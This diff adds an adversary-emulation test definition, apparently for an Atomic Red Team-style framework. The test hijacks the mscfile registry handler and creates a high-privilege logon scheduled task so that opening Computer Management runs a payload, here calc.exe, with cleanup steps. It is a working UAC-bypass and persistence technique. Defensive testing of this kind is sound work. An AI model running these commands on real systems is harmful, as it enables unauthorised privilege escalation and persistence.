@@ -1,0 +1,18 @@
+- id: 400925db-56e6-5b8b-8420-eb7fa8d24e21
+  name: Soumaia ART Tests - Scheduled Task Persistence via CompMgmt.msc
+  description: "Adds persistence by abusing `compmgmt.msc` via a scheduled task.\nWhen the Computer Management console is opened, it will run a malicious payload (in this case, `calc.exe`). \nThis technique abuses scheduled tasks and registry modifications to hijack legitimate system processes. (requires elevation)"
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1053.005
+    name: 'Scheduled Task/Job: Scheduled Task'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\calc.exe" /f
+          schtasks /Create /TN "CompMgmtBypass" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F
+          ECHO Let's open the Computer Management console now...
+          compmgmt.msc
+        cleanup: |-
+          reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
+          schtasks /Delete /TN "CompMgmtBypass" /F
